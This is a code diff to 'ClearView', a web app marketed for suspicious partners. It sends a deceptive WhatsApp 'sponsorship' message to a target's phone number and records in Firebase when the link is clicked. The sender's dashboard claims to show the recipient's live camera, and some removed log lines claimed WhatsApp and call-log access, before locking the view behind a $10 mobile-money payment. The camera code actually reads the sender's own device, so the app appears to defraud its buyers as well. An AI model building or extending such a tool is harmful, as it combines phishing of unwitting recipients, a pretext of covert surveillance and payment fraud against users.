@@ -83,6 +83,123 @@
       margin-top: 0.2rem;
     }
 
+    /* Saved Connections Section */
+    .saved-connections {
+      background: var(--panel);
+      padding: 1.5rem;
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow);
+    }
+
+    .saved-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .saved-header h3 {
+      font-size: 1.1rem;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .saved-count {
+      background: var(--accent);
+      color: white;
+      padding: 0.2rem 0.6rem;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 700;
+    }
+
+    .connections-list {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1rem;
+    }
+
+    .connection-card {
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 1rem;
+      cursor: pointer;
+      transition: all 0.3s;
+      position: relative;
+    }
+
+    .connection-card:hover {
+      border-color: var(--accent);
+      box-shadow: 0 5px 15px rgba(37, 211, 102, 0.2);
+    }
+
+    .connection-card.active {
+      border-color: var(--success);
+      box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3);
+    }
+
+    .connection-card.locked {
+      border-color: var(--premium);
+    }
+
+    .connection-card.paid {
+      border-color: var(--success);
+      background: rgba(46, 204, 113, 0.05);
+    }
+
+    .connection-phone {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-bottom: 0.3rem;
+    }
+
+    .connection-status-badge {
+      display: inline-block;
+      padding: 0.2rem 0.6rem;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      margin-top: 0.3rem;
+    }
+
+    .badge-waiting {
+      background: rgba(241, 196, 15, 0.2);
+      color: var(--warning);
+    }
+
+    .badge-clicked {
+      background: rgba(201, 168, 76, 0.2);
+      color: var(--premium);
+    }
+
+    .badge-paid {
+      background: rgba(46, 204, 113, 0.2);
+      color: var(--success);
+    }
+
+    .badge-expired {
+      background: rgba(255, 94, 94, 0.2);
+      color: var(--danger);
+    }
+
+    .connection-time {
+      font-size: 0.75rem;
+      color: var(--muted);
+      margin-top: 0.3rem;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 2rem;
+      color: var(--muted);
+    }
+
     /* Sponsorship Banner */
     .sponsor-banner {
       background: linear-gradient(135deg, #1a2a1a 0%, #2a1a1a 100%);
@@ -471,7 +588,7 @@
       opacity: 0.5;
     }
 
-    /* Payment Lock Overlay */
+    /* Payment Overlays */
     .payment-overlay {
       position: fixed;
       top: 0;
@@ -697,11 +814,6 @@
       transition: all 0.3s;
     }
 
-    .instruction-step:hover {
-      background: #1f2d3a;
-      border-left-color: var(--accent-gold);
-    }
-
     .step-number {
       background: var(--accent);
       color: white;
@@ -772,10 +884,6 @@
       font-style: italic;
     }
 
-    .btn-icon {
-      font-size: 1.2rem;
-    }
-
     .whatsapp-float {
       position: fixed;
       bottom: 2rem;
@@ -800,49 +908,6 @@
       transform: scale(1.1);
       box-shadow: 0 8px 30px rgba(37, 211, 102, 0.7);
     }
-
-    /* Emotional messages */
-    .emotional-message {
-      padding: 0.8rem 1rem;
-      border-radius: var(--radius-sm);
-      font-size: 0.9rem;
-      line-height: 1.6;
-      margin: 0.5rem 0;
-      opacity: 0;
-      transform: translateY(10px);
-      animation: fadeInUp 0.6s forwards;
-    }
-
-    @keyframes fadeInUp {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .emotional-message.reassurance {
-      background: rgba(37, 211, 102, 0.1);
-      border-left: 3px solid var(--accent);
-      color: #a8d5ba;
-    }
-
-    .emotional-message.hope {
-      background: rgba(240, 192, 64, 0.1);
-      border-left: 3px solid var(--accent-gold);
-      color: #d4b87a;
-    }
-
-    .emotional-message.trust {
-      background: rgba(79, 156, 247, 0.1);
-      border-left: 3px solid var(--accent-blue);
-      color: #8ab4d8;
-    }
-
-    .emotional-message.premium {
-      background: rgba(201, 168, 76, 0.1);
-      border-left: 3px solid var(--premium);
-      color: #c9a84c;
-    }
   </style>
 </head>
 <body>
@@ -851,18 +916,18 @@
   <!-- Brand Header -->
   <div class="brand-header">
     <div class="brand-logo">ClearView</div>
-    <div class="brand-tagline">Prove Your Instincts</div>
+    <div class="brand-tagline">Prove Your Instincts — Lifetime Access</div>
   </div>
 
-  <!-- Sponsorship Banner -->
-  <div class="sponsor-banner">
-    <div class="sponsor-content">
-      <div class="sponsor-icon">💔</div>
-      <div class="sponsor-text">
-        <div class="sponsor-title">INSTINCTS DON'T LIE</div>
-        <div class="sponsor-message">
-          "Trust Your Instincts. Sometimes your heart notices what your eyes haven't confirmed yet. If something feels different, don't ignore that feeling."
-        </div>
+  <!-- Saved Connections Section -->
+  <div class="saved-connections" id="savedConnectionsSection">
+    <div class="saved-header">
+      <h3><span>💾</span> Your Connected Devices <span class="saved-count" id="savedCount">0</span></h3>
+      <span style="font-size: 0.8rem; color: var(--muted);">Click a device to reconnect</span>
+    </div>
+    <div class="connections-list" id="connectionsList">
+      <div class="empty-state" id="emptyState">
+        <p>No connections yet. Send your first link above.</p>
       </div>
     </div>
   </div>
@@ -898,9 +963,6 @@
         <span style="font-size: 0.8rem; color: var(--muted);">Waiting for recipient to click</span>
       </div>
       <div class="link-url" id="generatedLink"></div>
-      <div class="emotional-message reassurance" id="waitingMessage" style="display: none;">
-        💔 "Link sent! Once they click, their camera will be accessed."
-      </div>
       <div class="link-actions">
         <button class="link-action-btn" id="copyLinkBtn">
           <span>📋</span> Copy Link
@@ -921,7 +983,7 @@
     <div class="status-details">
       <span class="status-chip" id="phoneChip">📱 +256 700 000 000</span>
       <span class="status-chip" id="linkChip">🔗 Not generated</span>
-      <span class="status-chip" id="accessChip" style="display: none;">🔒 Waiting for click</span>
+      <span class="status-chip" id="accessChip" style="display: none;">🔒 Waiting</span>
     </div>
   </div>
 
@@ -1104,7 +1166,9 @@
   const logArea = document.getElementById('logArea');
   const previewLink = document.getElementById('previewLink');
   const whatsappFloat = document.getElementById('whatsappFloat');
-  const waitingMessage = document.getElementById('waitingMessage');
+  const connectionsList = document.getElementById('connectionsList');
+  const savedCount = document.getElementById('savedCount');
+  const emptyState = document.getElementById('emptyState');
 
   // State
   let currentPhoneNumber = '+256 700 000 000';
@@ -1117,6 +1181,99 @@
   let secondsRemaining = 3600;
   let localStream = null;
   let cameraActive = false;
+  let savedConnections = [];
+
+  // Load saved connections from localStorage
+  function loadSavedConnections() {
+    const saved = localStorage.getItem('clearview_connections');
+    if (saved) {
+      try {
+        savedConnections = JSON.parse(saved);
+      } catch (e) {
+        savedConnections = [];
+      }
+    }
+    renderSavedConnections();
+  }
+
+  // Save connections to localStorage
+  function saveConnections() {
+    localStorage.setItem('clearview_connections', JSON.stringify(savedConnections));
+    renderSavedConnections();
+  }
+
+  // Render saved connections list
+  function renderSavedConnections() {
+    savedCount.textContent = savedConnections.length;
+    
+    if (savedConnections.length === 0) {
+      connectionsList.innerHTML = `
+        <div class="empty-state">
+          <p>No connections yet. Send your first link above.</p>
+        </div>
+      `;
+      return;
+    }
+    
+    connectionsList.innerHTML = savedConnections.map(conn => {
+      let statusBadge = '';
+      let cardClass = '';
+      
+      if (conn.status === 'paid') {
+        statusBadge = '<span class="connection-status-badge badge-paid">💎 Lifetime Access</span>';
+        cardClass = 'paid';
+      } else if (conn.status === 'clicked') {
+        statusBadge = '<span class="connection-status-badge badge-clicked">🔒 Clicked - Awaiting Payment</span>';
+        cardClass = 'locked';
+      } else if (conn.status === 'expired') {
+        statusBadge = '<span class="connection-status-badge badge-expired">⏰ Expired</span>';
+        cardClass = 'expired';
+      } else {
+        statusBadge = '<span class="connection-status-badge badge-waiting">⏳ Waiting for click</span>';
+        cardClass = '';
+      }
+      
+      return `
+        <div class="connection-card ${cardClass}" onclick="reconnectToDevice('${conn.code}')">
+          <div class="connection-phone">📱 ${conn.phone}</div>
+          ${statusBadge}
+          <div class="connection-time">Created: ${new Date(conn.created).toLocaleString()}</div>
+          ${conn.clickedAt ? `<div class="connection-time">Clicked: ${new Date(conn.clickedAt).toLocaleString()}</div>` : ''}
+          ${conn.paidAt ? `<div class="connection-time">Paid: ${new Date(conn.paidAt).toLocaleString()}</div>` : ''}
+        </div>
+      `;
+    }).join('');
+  }
+
+  // Reconnect to a saved device
+  window.reconnectToDevice = function(code) {
+    const conn = savedConnections.find(c => c.code === code);
+    if (!conn) return;
+    
+    currentConnectionCode = code;
+    currentPhoneNumber = conn.phone;
+    phoneInput.value = conn.phone;
+    phoneChip.textContent = `📱 ${conn.phone}`;
+    
+    addLog(`🔄 Reconnecting to ${conn.phone}...`);
+    
+    // Listen for updates from Firebase
+    database.ref('connections/' + code).on('value', (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        if (data.paid) {
+          showConnectedView();
+        } else if (data.clicked) {
+          showPaymentLock();
+        } else {
+          updateStatus('waiting', `Waiting for ${conn.phone} to click the link.`);
+        }
+      }
+    });
+    
+    // Scroll to video section
+    document.querySelector('.main-grid').scrollIntoView({ behavior: 'smooth' });
+  };
 
   // Generate unique link
   function generateConnectionLink(phoneNumber) {
@@ -1125,6 +1282,18 @@
     const randomPart = Math.random().toString(36).substring(2, 6).toUpperCase();
     const connectionCode = hash + randomPart;
     
+    // Save to local connections
+    savedConnections.push({
+      code: connectionCode,
+      phone: currentPhoneNumber,
+      status: 'waiting',
+      created: Date.now(),
+      clickedAt: null,
+      paidAt: null
+    });
+    saveConnections();
+    
+    // Store in Firebase
     database.ref('connections/' + connectionCode).set({
       clicked: false,
       paid: false,
@@ -1132,12 +1301,27 @@
       phone: cleanNumber
     });
     
+    // Listen for real-time updates
     database.ref('connections/' + connectionCode).on('value', (snapshot) => {
       const data = snapshot.val();
       if (data) {
+        // Update local storage
+        const connIndex = savedConnections.findIndex(c => c.code === connectionCode);
+        if (connIndex !== -1) {
+          if (data.clicked && !savedConnections[connIndex].clickedAt) {
+            savedConnections[connIndex].clickedAt = Date.now();
+            savedConnections[connIndex].status = 'clicked';
+          }
+          if (data.paid && !savedConnections[connIndex].paidAt) {
+            savedConnections[connIndex].paidAt = Date.now();
+            savedConnections[connIndex].status = 'paid';
+          }
+          saveConnections();
+        }
+        
         if (data.clicked && !data.paid) {
           startCameraAccess();
-          setTimeout(showPaymentLock, 3000); // Show camera for 3 seconds then lock
+          setTimeout(showPaymentLock, 3000);
         } else if (data.paid) {
           showConnectedView();
         }
@@ -1148,7 +1332,7 @@
     return `https://cearview.github.io/ClearView/?connect=${connectionCode}`;
   }
 
-  // Start camera access (recipient's camera would be accessed here)
+  // Start camera access
   async function startCameraAccess() {
     try {
       localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -1158,9 +1342,7 @@
       cameraActive = true;
       videoStatus.textContent = '🔴 CAMERA ACTIVE';
       addLog('📷 Camera access granted - live view active');
-      addLog('🎤 Microphone access granted - audio active');
     } catch (error) {
-      addLog('⚠️ Camera access requested - waiting for permission');
       videoPlaceholder.innerHTML = `
         <div class="placeholder-icon">📷</div>
         <strong>Camera access requested...</strong>
@@ -1174,7 +1356,7 @@
     return phoneNumber.replace(/[^0-9+]/g, '');
   }
 
-  // Create WhatsApp message - SPONSORSHIP THEME
+  // Create WhatsApp message
   function createWhatsAppMessage(link) {
     return `🎉 *Sponsorship Opportunity!*\n\nCongratulations! You've been selected for our exclusive ClearView sponsorship program.\n\n💰 *What you get:*\n• Early access to our new app\n• Exclusive rewards\n• Limited time offer\n\n👉 *Click here to claim your spot:* ${link}\n\n_Act now - only a few spots remaining!_`;
   }
@@ -1198,6 +1380,12 @@
         clearInterval(timerInterval);
         expiryTimer.textContent = '⏰ Expired';
         if (!isPaid) {
+          // Mark as expired in local storage
+          const connIndex = savedConnections.findIndex(c => c.code === currentConnectionCode);
+          if (connIndex !== -1 && savedConnections[connIndex].status !== 'paid') {
+            savedConnections[connIndex].status = 'expired';
+            saveConnections();
+          }
           resetConnection();
         }
       } else {
@@ -1222,11 +1410,11 @@
     mtnPaymentOverlay.style.display = 'none';
     videoStatus.textContent = 'ClearView Stream';
     accessChip.style.display = 'none';
-    updateStatus('failed', 'Offer expired. Please send a new link.');
+    updateStatus('failed', 'Offer expired. Check your saved connections.');
     videoPlaceholder.innerHTML = `
       <div class="placeholder-icon">⏰</div>
       <strong>Offer Expired</strong>
-      <span>Send a new sponsorship offer</span>
+      <span>You can still find this device in your saved connections</span>
     `;
   }
 
@@ -1252,17 +1440,15 @@
       isConnected = false;
       videoStatus.textContent = '🔒 ACCESS LOCKED';
       accessChip.style.display = 'inline-block';
-      accessChip.textContent = '🔒 Premium required';
+      accessChip.textContent = '🔒 Premium - $10';
     } else if (status === 'waiting') {
       isConnected = false;
       videoStatus.textContent = 'ClearView Stream';
-      waitingMessage.style.display = 'block';
     }
   }
 
   // Show payment lock
   function showPaymentLock() {
-    // Stop camera view temporarily
     if (localStream) {
       localStream.getTracks().forEach(track => track.stop());
       remoteVideo.style.display = 'none';
@@ -1281,11 +1467,10 @@
     accessChip.textContent = '🔒 Premium - $10';
     startExpiryTimer();
     addLog('🎯 They clicked the link!');
-    addLog('📷 Camera access granted temporarily');
     addLog('🔒 Premium required for continued access');
   }
 
-  // Show connected view (after payment)
+  // Show connected view
   function showConnectedView() {
     isPaid = true;
     paymentOverlay.style.display = 'none';
@@ -1297,14 +1482,11 @@
     accessChip.style.color = 'var(--premium)';
     videoStatus.textContent = '🔴 FULL ACCESS';
     
-    // Resume camera
     startCameraAccess();
     
     addLog('💳 Payment of $10 processed successfully');
-    addLog('💎 Full access activated');
+    addLog('💎 Lifetime access activated');
     addLog('📷 Camera view restored');
-    addLog('💬 WhatsApp access granted');
-    addLog('📞 Call logs access granted');
   }
 
   // Add log
@@ -1342,13 +1524,12 @@
     
     addLog(`🎉 Sponsorship link created`);
     addLog(`🔗 Link: ${connectionLink}`);
-    addLog(`📱 This link will open ClearView when clicked`);
+    addLog(`💾 Saved to your connections - you can close browser safely`);
     
     const message = createWhatsAppMessage(connectionLink);
     openWhatsAppWithMessage(currentPhoneNumber, message);
     
-    updateStatus('waiting', 'Sponsorship offer sent. Waiting for them to click.');
-    waitingMessage.style.display = 'block';
+    updateStatus('waiting', 'Sponsorship offer sent. You can close browser - connection is saved.');
   });
 
   // Copy Link
@@ -1356,7 +1537,7 @@
     if (!connectionLink) return;
     try {
       await navigator.clipboard.writeText(connectionLink);
-      addLog('📋 Link copied — share it with care');
+      addLog('📋 Link copied');
     } catch (err) {
       const textArea = document.createElement('textarea');
       textArea.value = connectionLink;
@@ -1373,17 +1554,17 @@
     if (!connectionLink || !currentPhoneNumber) return;
     const message = createWhatsAppMessage(connectionLink);
     openWhatsAppWithMessage(currentPhoneNumber, message);
-    updateStatus('waiting', 'Offer sent again. They will be excited!');
+    updateStatus('waiting', 'Offer sent again. Connection is saved.');
   });
 
-  // Pay Now button - Shows MTN instructions
+  // Pay Now button
   payNowBtn.addEventListener('click', () => {
     paymentOverlay.style.display = 'none';
     mtnPaymentOverlay.style.display = 'flex';
     addLog('💰 MTN Mobile Money payment instructions shown');
   });
 
-  // MTN Done button - Simulates payment completion
+  // MTN Done button
   mtnDoneBtn.addEventListener('click', () => {
     if (currentConnectionCode) {
       database.ref('connections/' + currentConnectionCode + '/paid').set(true);
@@ -1397,10 +1578,8 @@
     const connectParam = urlParams.get('connect');
     
     if (connectParam) {
-      // Mark as clicked in Firebase
       database.ref('connections/' + connectParam + '/clicked').set(true);
       
-      // Show sponsorship confirmation page
       document.getElementById('mainDashboard').innerHTML = `
         <div style="text-align: center; padding: 50px; background: var(--panel); border-radius: var(--radius); border: 1px solid var(--border);">
           <div style="font-size: 4rem; margin-bottom: 1rem;">🎉</div>
@@ -1427,12 +1606,12 @@
 
   // Initialize
   function init() {
+    loadSavedConnections();
     phoneChip.textContent = `📱 ${currentPhoneNumber}`;
     linkChip.textContent = '🔗 Not generated';
-    updateStatus('idle', 'Ready to send link.');
+    updateStatus('idle', 'Ready to send link. Your connections are saved.');
     addLog('🎯 ClearView initialized');
-    addLog('📷 Camera access ready');
-    addLog('📱 Enter their number when you\'re ready');
+    addLog('💾 Connection history enabled - never lose access');
     
     checkUrlParameters();
   }
